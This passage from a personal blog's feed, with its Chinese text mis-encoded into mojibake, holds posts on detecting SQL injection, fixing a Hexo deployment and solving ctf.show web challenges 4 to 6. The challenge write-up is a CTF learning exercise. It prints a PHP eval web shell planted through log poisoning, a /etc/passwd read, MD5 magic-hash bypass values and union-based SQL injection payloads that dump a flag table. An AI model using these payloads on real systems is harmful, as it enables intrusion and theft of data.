    <id>https://kannikanyun.github.io/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/</id>
    <published>2022-04-05T08:01:55.000Z</published>
    <updated>2022-04-21T12:40:24.920Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥"><a href="#ç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥" class="headerlink" title="ç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥"></a>ç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥</h1><h2 id="å•å¼•å·åˆ¤æ–­"><a href="#å•å¼•å·åˆ¤æ–­" class="headerlink" title="å•å¼•å·åˆ¤æ–­"></a><strong>å•å¼•å·åˆ¤æ–­</strong></h2><p><strong>$idå‚æ•°å·¦å³æœ‰æ•°å­—å‹ï¼ˆæ— ï¼‰ã€å•å¼•å·ã€åŒå¼•å·ã€æ‹¬å·ç­‰æ–¹å¼ç»„æˆé—­åˆï¼›</strong></p><p>æœ€ä¸ºç»å…¸çš„==å•å¼•å·åˆ¤æ–­æ³•ï¼š==åœ¨å‚æ•°åé¢åŠ ä¸Šå•å¼•å·â€™æ¯”å¦‚:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ã€€http:<span class="token comment">//xxx/abc.php?id=1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ã€€ã€€å¦‚æœé¡µé¢è¿”å›é”™è¯¯ï¼Œåˆ™å­˜åœ¨ Sql æ³¨å…¥ã€‚ åŸå› æ˜¯æ— è®ºå­—ç¬¦å‹è¿˜æ˜¯æ•´å‹éƒ½ä¼šå› ä¸º</p><blockquote><p><strong>å•å¼•å·ä¸ªæ•°ä¸åŒ¹é…</strong></p></blockquote><p>è€ŒæŠ¥é”™ã€‚</p><h2 id="ä¸‡èƒ½è¯­å¥ï¼š"><a href="#ä¸‡èƒ½è¯­å¥ï¼š" class="headerlink" title="ä¸‡èƒ½è¯­å¥ï¼š"></a>ä¸‡èƒ½è¯­å¥ï¼š</h2><p>å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ username ä¸º 1â€™ or 1=1 #ï¼Œéšæ„è¾“å…¥ passwordï¼Œé‚£ä¹ˆä¼ å…¥åç«¯éªŒè¯æ—¶ï¼Œsqlè¯­å¥å°±æ˜¯</p><blockquote><p><strong><strong>*%23ä¸º#æ³¨é‡Šç¬¦çš„urlç¼–ç *</strong></strong></p></blockquote><pre><code>select * from table_name where username=&#39;1&#39; or 1=1 # &#39; and password=&#39;xxxxxx&#39;</code></pre><h1 id="é€šå¸¸-Sql-æ³¨å…¥æ¼æ´åˆ†ä¸º-2-ç§ç±»å‹ï¼š"><a href="#é€šå¸¸-Sql-æ³¨å…¥æ¼æ´åˆ†ä¸º-2-ç§ç±»å‹ï¼š" class="headerlink" title="é€šå¸¸ Sql æ³¨å…¥æ¼æ´åˆ†ä¸º 2 ç§ç±»å‹ï¼š"></a>é€šå¸¸ <u>Sql</u> æ³¨å…¥æ¼æ´åˆ†ä¸º 2 ç§ç±»å‹ï¼š</h1><blockquote><p>ã€€ã€€<strong>æ•°å­—å‹</strong></p><p>ã€€ã€€<strong>å­—ç¬¦å‹</strong></p></blockquote><h2 id="æ•°å­—å‹åˆ¤æ–­ï¼š"><a href="#æ•°å­—å‹åˆ¤æ–­ï¼š" class="headerlink" title="æ•°å­—å‹åˆ¤æ–­ï¼š"></a>æ•°å­—å‹åˆ¤æ–­ï¼š</h2><p>ã€€ã€€å½“è¾“å…¥çš„å‚ x ä¸ºæ•´å‹æ—¶ï¼Œé€šå¸¸ 123.php ä¸­ Sql è¯­å¥ç±»å‹å¤§è‡´å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">select <span class="token operator">*</span> from <span class="token operator">&lt;</span>è¡¨å<span class="token operator">></span> where id <span class="token operator">=</span> x     è¿™ç§ç±»å‹å¯ä»¥ä½¿ç”¨ç»å…¸çš„ <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> å’Œ <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> æ¥åˆ¤æ–­ï¼š<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>ã€€ã€€Url åœ°å€ä¸­è¾“å…¥ <a href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x <strong>and 1=1</strong> é¡µé¢ä¾æ—§è¿è¡Œæ­£å¸¸ï¼Œç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥ã€‚(è¯´æ˜sqlè¯­å¥æ‰§è¡Œäº†ï¼Œè¯­å¥è¯­æ³•åŠé€»è¾‘åˆ¤æ–­æ­£ç¡®ï¼Œå› æ­¤ä¸æŠ¥é”™)</p></blockquote><p>ã€€ã€€Url åœ°å€ä¸­<u><strong>ç»§ç»­</strong></u>è¾“å…¥ </p><p><code>http://xxx/abc.php?id= x **and 1=2**</code> </p><p>é¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤ Sql æ³¨å…¥ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚</p><h3 id="è¯­å¥è§£é‡Š"><a href="#è¯­å¥è§£é‡Š" class="headerlink" title="è¯­å¥è§£é‡Š"></a>è¯­å¥è§£é‡Š</h3><p>å½“è¾“å…¥ and 1=1æ—¶ï¼Œåå°æ‰§è¡Œ Sql è¯­å¥ï¼š</p><p>ã€€ã€€<code>select * from &lt;è¡¨å&gt; where id = x and 1=1</code></p><p>ã€€ã€€å½“è¾“å…¥ and 1=2æ—¶ï¼Œåå°æ‰§è¡Œ Sql è¯­å¥ï¼š</p><p>ã€€ã€€select * from &lt;è¡¨å&gt; where id = x and 1=2</p><p>ã€€ã€€æ²¡æœ‰è¯­æ³•é”™è¯¯ä½†æ˜¯é€»è¾‘åˆ¤æ–­ä¸ºå‡ï¼Œæ‰€ä»¥è¿”å›é”™è¯¯ã€‚ </p><p>æˆ‘ä»¬å†ä½¿ç”¨==å‡è®¾æ³•ï¼š==å¦‚æœè¿™æ˜¯å­—ç¬¦å‹æ³¨å…¥çš„è¯ï¼Œæˆ‘ä»¬è¾“å…¥ä»¥ä¸Šè¯­å¥ä¹‹ååº”è¯¥å‡ºç°å¦‚ä¸‹æƒ…å†µï¼š</p><p>ã€€ã€€<code>select * from &lt;è¡¨å&gt; where id = &#39;x **and 1=1**&#39; select * from &lt;è¡¨å&gt; where id = &#39;x **and 1=2**&#39;</code></p><p>ã€€ã€€æŸ¥è¯¢è¯­å¥å°† and è¯­å¥å…¨éƒ¨è½¬æ¢ä¸ºäº†å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œ and çš„é€»è¾‘åˆ¤æ–­ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°ä»¥ä¸Šç»“æœï¼Œæ•…å‡è®¾æ˜¯ä¸æˆç«‹çš„ã€‚</p><h2 id="å­—ç¬¦å‹åˆ¤æ–­ï¼š"><a href="#å­—ç¬¦å‹åˆ¤æ–­ï¼š" class="headerlink" title="å­—ç¬¦å‹åˆ¤æ–­ï¼š"></a>å­—ç¬¦å‹åˆ¤æ–­ï¼š</h2><p>ã€€ã€€å½“è¾“å…¥çš„å‚ x ä¸ºå­—ç¬¦å‹æ—¶ï¼Œé€šå¸¸ 123.php ä¸­ SQL è¯­å¥ç±»å‹å¤§è‡´å¦‚ä¸‹ï¼š select * from &lt;è¡¨å&gt; where id = <strong>â€˜xâ€™</strong> è¿™ç§ç±»å‹æˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨ <strong>and â€˜1â€™=â€™1</strong> å’Œ <strong>and â€˜1â€™=â€™2</strong>æ¥åˆ¤æ–­ï¼š</p><p>ã€€ã€€<code>Url åœ°å€ä¸­è¾“å…¥ http://xxx/abc.php?id= x**&#39; and &#39;1&#39;=&#39;1**</code> </p><p>é¡µé¢è¿è¡Œæ­£å¸¸ï¼Œç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</p><p>ã€€ã€€<code>Url åœ°å€ä¸­ç»§ç»­è¾“å…¥ http://xxx/abc.php?id= x**&#39; and &#39;1&#39;=&#39;2**</code> </p><p>é¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤ Sql æ³¨å…¥ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚</p><h3 id="è¯­å¥è§£é‡Š-1"><a href="#è¯­å¥è§£é‡Š-1" class="headerlink" title="è¯­å¥è§£é‡Š"></a>è¯­å¥è§£é‡Š</h3><blockquote><p>â€˜ çš„ä½œç”¨æ˜¯ä½¿è¯­å¥é—­åˆï¼Œå¦åˆ™æ•´ä¸ªè¯­å¥å°†è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="SQL" scheme="https://kannikanyun.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-blogæ­å»ºé—®é¢˜æ±‡æ€»</title>
    <link href="https://kannikanyun.github.io/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <id>https://kannikanyun.github.io/2022/04/03/Hexo-blog%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</id>
    <published>2022-04-03T11:15:38.000Z</published>
    <updated>2022-06-17T05:29:46.618Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-hexo-då‘½ä»¤æ—¶æç¤ºè¾“å…¥è´¦å·å’Œå¯†ç "><a href="#1-hexo-då‘½ä»¤æ—¶æç¤ºè¾“å…¥è´¦å·å’Œå¯†ç " class="headerlink" title="1.hexo då‘½ä»¤æ—¶æç¤ºè¾“å…¥è´¦å·å’Œå¯†ç "></a>1.hexo då‘½ä»¤æ—¶æç¤ºè¾“å…¥è´¦å·å’Œå¯†ç </h1><p>é—®é¢˜èµ·æºæ¥è‡ªä¸€æ¬¡hexo dçš„å‘½ä»¤éƒ¨ç½²å¤±è´¥ï¼ˆä»blogæ­å»ºå¼€å§‹é‚£å¤©ï¼Œåªè¦é€‰æ‹©è¿œç«¯éƒ¨ç½²ï¼ŒæŠ¥é”™å°±æ²¡æ¶ˆåœè¿‡ï¼‰<br>hexo dåä¸€ç›´æŠ¥é”™ï¼Œæç¤ºæ— æ³•è¿æ¥githubï¼Œäºæ˜¯ä¿®æ”¹äº†sshï¼Œé‡æ–°é…ç½®äº†_config.ymlä¸­çš„deployï¼šrepo: <a href="https://github.com/KanNiKanYun/KanNiKanYun.github.io">https://github.com/KanNiKanYun/KanNiKanYun.github.io</a><br>ä½†æ˜¯ä¾æ—§æ²¡èƒ½è§£å†³é—®é¢˜ï¼šæ— æ³•éƒ¨ç½²è¿œç«¯</p><h2 id="äºæ˜¯ç»§ç»­æŸ¥è¯¢è§£å†³æ–¹æ¡ˆ"><a href="#äºæ˜¯ç»§ç»­æŸ¥è¯¢è§£å†³æ–¹æ¡ˆ" class="headerlink" title="äºæ˜¯ç»§ç»­æŸ¥è¯¢è§£å†³æ–¹æ¡ˆ "></a><strong>äºæ˜¯ç»§ç»­æŸ¥è¯¢è§£å†³æ–¹æ¡ˆ</strong> </h2><p><a href="https://blog.csdn.net/hhgggggg/article/details/77853665">https://blog.csdn.net/hhgggggg/article/details/77853665</a><br>è§£å†³å‚è€ƒé“¾æ¥å¦‚ä¸Š<br>å…³é”®æ­¥éª¤ï¼š<br>é…ç½®ropeä¸ºrepo: <a href="mailto:&#x67;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;">&#x67;&#x69;&#116;&#x40;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;</a>:<strong><u>kannikanyun/kannikanyun</u></strong>.github.io.git</p><h2 id="giteeå›¾åºŠå¤±æ•ˆåçš„æ–°çš„é€‰æ‹©æ–¹å¼"><a href="#giteeå›¾åºŠå¤±æ•ˆåçš„æ–°çš„é€‰æ‹©æ–¹å¼" class="headerlink" title="giteeå›¾åºŠå¤±æ•ˆåçš„æ–°çš„é€‰æ‹©æ–¹å¼"></a>giteeå›¾åºŠå¤±æ•ˆåçš„æ–°çš„é€‰æ‹©æ–¹å¼</h2><p><a href="https://blog.csdn.net/rong09_13/article/details/123885104?ops_request_misc=%7B%22request_id%22:%22164897506216780255258485%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164897506216780255258485&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123885104.142%5Ev5%5Epc_search_insert_es_download,157%5Ev4%5Enew_style&utm_term=gitee%E5%9B%BE%E5%BA%8A%E4%B8%8D%E8%83%BD&spm=1018.2226.3001.4187">å…·ä½“å‚è€ƒé…ç½®</a></p><p>æ¦‚æ‹¬ï¼šä½¿ç”¨githubä»“åº“ä½œä¸ºå›¾åºŠ</p><h3 id="ç¼ºç‚¹ï¼š"><a href="#ç¼ºç‚¹ï¼š" class="headerlink" title="ç¼ºç‚¹ï¼š"></a>ç¼ºç‚¹ï¼š</h3><p>1.ä¸Šä¼ é€Ÿåº¦æ…¢</p><p>2.éœ€è¦ä¸€æ®µæ—¶é—´åæ›´æ¢ä»“åº“ï¼Œä»¥å…å ç”¨ç©ºé—´è¿‡å¤§è¢«æ£€æµ‹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="BLOG" scheme="https://kannikanyun.github.io/tags/BLOG/"/>
    
  </entry>
  
  <entry>
    <title>ctfShow-web-4-6</title>
    <link href="https://kannikanyun.github.io/2022/04/01/ctfShow-web-4-6/"/>
    <id>https://kannikanyun.github.io/2022/04/01/ctfShow-web-4-6/</id>
    <published>2022-04-01T11:17:03.000Z</published>
    <updated>2022-04-03T12:51:40.187Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="4-ctf-show-web4"><a href="#4-ctf-show-web4" class="headerlink" title="4.ctf.show_web4"></a>4.ctf.show_web4</h1><p>é¢˜ç›®æè¿°å’Œweb3æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯3çš„æ–¹æ³•å·²ç»ä¸è¡Œäº†ï¼Œæ²¡æœ‰æ€è·¯ï¼Œçœ‹æç¤º</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051792.png"></p><pre class="line-numbers language-html" data-language="html"><code class="language-html">/etc/passwdä¾æ—§å¯ä»¥è®¿é—®<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">æ–‡ä»¶åŒ…å«  æ—¥å¿—æ³¨å…¥<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><u>è¯·æ±‚å¤´ä¸­å¯ä»¥çœ‹å‡ºï¼ŒæœåŠ¡å™¨æ˜¯<strong>nginx</strong></u></p><p>nginxçš„logåœ¨</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>access.logå…è®¸æ‰“å¼€</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">http:&#x2F;&#x2F;6339ac54-c058-4ed2-a21d-5fe884f66c63.challenge.ctf.show&#x2F;?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051635.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">åœ¨UAä¸­æ·»åŠ <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é˜²æ­¢urlç¼–ç </p><p>ä½¿ç”¨èšå‰‘æˆåŠŸè¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051517.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051563.png"></p><p><a href="%5B(66%E6%9D%A1%E6%B6%88%E6%81%AF">refer to</a> CTF show WEB 1-4_yu22xçš„åšå®¢-CSDNåšå®¢_ctfshow web](<a href="https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11">https://blog.csdn.net/miuzzx/article/details/104321970?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7.pc_relevant_antiscanv2&amp;utm_relevant_index=11</a>))</p><h1 id="5-ctf-show-web5"><a href="#5-ctf-show-web5" class="headerlink" title="5.ctf.show_web5"></a>5.ctf.show_web5</h1><h2 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"v1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"v2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"where is flag?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹                </p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031821505.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031822954.png"></p><p><strong>æ ¹æ®é¢˜ç›®çš„phpä»£ç è¦æ±‚ï¼šéœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°v1å’Œv2ï¼Œv1å¿…é¡»ä¸ºå­—æ¯ï¼Œv2å¿…é¡»ä¸ºæ•°å­—ï¼Œå¦‚æœä¸¤è€…çš„MD5å€¼ç›¸åŒï¼Œè¾“å‡ºflag</strong></p><p>æ¶‰åŠäº†PHP md5()å‡½æ•°</p><blockquote><p>Phpä¸º<strong>å¼±ç±»å‹</strong>è¯­è¨€<br>Phpä¸­çš„** == <strong>ä¸º</strong>å¼±ç±»å‹æ¯”è¾ƒ**<br>Md5ç¢°æ’åˆ©ç”¨â€˜<strong>0e</strong>â€™å¼€å¤´çš„<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a><br>Phpè§£é‡Šå™¨å°†eè§£é‡Šä¸º <strong>ç§‘å­¦è®°æ•°æ³•</strong> åˆ†éš”<br>å› æ­¤åªè¦ä¸¤æ®µæ˜æ–‡çš„md5ç§˜æ–‡ä»¥0eå¼€å¤´ä¸”é•¿åº¦ç›¸åŒ</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">å¸¸ç”¨<span class="token constant">MD5</span>ç»•è¿‡å€¼ï¼šå­—æ¯æ•°å­—æ··åˆç±»ï¼ˆ<span class="token constant">MD5</span>å€¼ï¼‰ï¼šs878926199a<span class="token number">0e545993274517709034328855841020</span>s155964671a<span class="token number">0e342768416822451524974117254469</span>s214587387a<span class="token number">0e848240448830537924465865611904</span>s214587387a<span class="token number">0e848240448830537924465865611904</span> å¤§å†™å­—æ¯ç±»ï¼š<span class="token constant">QLTHNDT</span><span class="token number">0e405967825401955372549139051580</span> <span class="token constant">QNKCDZO</span><span class="token number">0e830400451993494058024219903391</span> <span class="token constant">EEIZDOI</span><span class="token number">0e782601363539291779881938479162</span> çº¯æ•°å­—ç±»ï¼š<span class="token number">240610708</span><span class="token number">0e462097431906509019562988736854</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-ctf-show-web6"><a href="#6-ctf-show-web6" class="headerlink" title="6.ctf.show_web6"></a>6.ctf.show_web6</h1><p>å°è¯•ä¸‡èƒ½å¯†ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or 1=1;#å…¶ä¸­#ä¸ºæ³¨é‡Šç¬¦ï¼Œè¯­å¥å¼€å¤´çš„'</span>ä¸èƒ½å¿½ç•¥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>æŠ¥é”™ï¼Œæ˜¾ç¤ºsql inject error</p><p>æœ‰å­—ç¬¦è¢«è¿‡æ»¤</p></blockquote><p>æ­¤å¤„ä½¿ç”¨<u>/**/</u>ä»£æ›¿ç©ºæ ¼</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span><span class="token keyword">or</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>ç™»é™†æˆåŠŸ</p><p>æ¬¢è¿ä½ ï¼Œctfshow    </p></blockquote><p>çˆ†åº“å¾—åˆ°(web2)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ¬¢è¿ä½ ï¼Œweb2    </p></blockquote><p>çˆ†è¡¨å¾—åˆ°(flag,user)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span>from<span class="token comment">/**/</span>information_schema<span class="token operator">.</span>tables<span class="token comment">/**/</span>where<span class="token comment">/**/</span>table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ¬¢è¿ä½ ï¼Œflag,user    </p></blockquote><p>çˆ†å­—æ®µå¾—åˆ°(flagå­—æ®µ)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='</span>flag'<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ¬¢è¿ä½ ï¼Œflag    </p></blockquote><p>çˆ†å­—æ®µå€¼å¾—åˆ°flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">'<span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span>from<span class="token comment">/**/</span>flag<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ¬¢è¿ä½ ï¼Œctfshow{f086e8a5-ae06-461f-8124-1371e2dc4987}    </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>javaç»§æ‰¿ä¸å°è£…å­¦ä¹ </title>
    <link href="https://kannikanyun.github.io/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/"/>
    <id>https://kannikanyun.github.io/2022/03/27/java%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%B0%81%E8%A3%85%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-27T03:40:17.000Z</published>
    <updated>2022-04-03T12:54:35.015Z</updated>
    
